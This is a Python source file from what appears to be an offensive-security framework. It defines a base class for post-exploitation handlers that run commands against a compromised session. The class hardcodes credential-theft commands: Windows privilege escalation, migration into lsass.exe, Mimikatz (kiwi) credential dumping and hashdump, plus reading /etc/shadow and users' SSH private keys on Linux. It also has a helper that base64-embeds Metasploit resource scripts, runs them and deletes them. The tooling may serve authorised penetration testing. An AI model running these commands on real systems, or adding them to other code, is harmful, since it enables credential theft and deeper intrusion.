"""Abstract base class for post-access handlers and shared helpers."""

from __future__ import annotations

import base64
import logging
from abc import ABC, abstractmethod
from typing import TYPE_CHECKING

from hydrasight.services.post_access.types import AccessType, PostAccessResult

if TYPE_CHECKING:
    from hydrasight.services.dispatcher import Dispatcher


class BasePostAccessHandler(ABC):
    """Abstract post-access handler.

    Concrete handlers run post-exploitation commands against an established
    session and return a structured :class:`PostAccessResult`.
    """

    access_type: AccessType = AccessType.UNKNOWN

    def __init__(
        self,
        log: logging.Logger,
        session: dict,
    ) -> None:
        self.log = log
        self.session = session

    @abstractmethod
    def execute(
        self,
        dispatcher: Dispatcher,
        target: str,
        lhost: str,
        lport: int,
        cfg: dict,
    ) -> PostAccessResult:
        """Run post-access commands and return structured results."""
        raise NotImplementedError

    def _default_commands(self, is_windows: bool) -> str:
        """Default post-access commands for the platform type."""
        if is_windows:
            return (
                "getuid;getsystem;migrate -N lsass.exe;"
                "load kiwi;creds_all;hashdump;"
                "run post/windows/gather/enum_shares"
            )
        return (
            "id;uname -a;cat /etc/passwd;"
            "cat /etc/shadow;ls -la /root;"
            "cat /home/*/.ssh/id_rsa 2>/dev/null"
        )

    def _rc_to_command(self, rc_content: str, rc_path: str) -> str:
        """Render a msfconsole resource script into a self-contained command.

        The script is base64-embedded so no quoting/special-character issues
        reach the shell; the temp file is removed after execution.
        """
        b64 = base64.b64encode(rc_content.encode()).decode()
        return (
            f"printf '%s' '{b64}' | base64 -d > {rc_path} && "
            f"msfconsole -q -r {rc_path} 2>&1 ; "
            f"rm -f {rc_path}"
        )
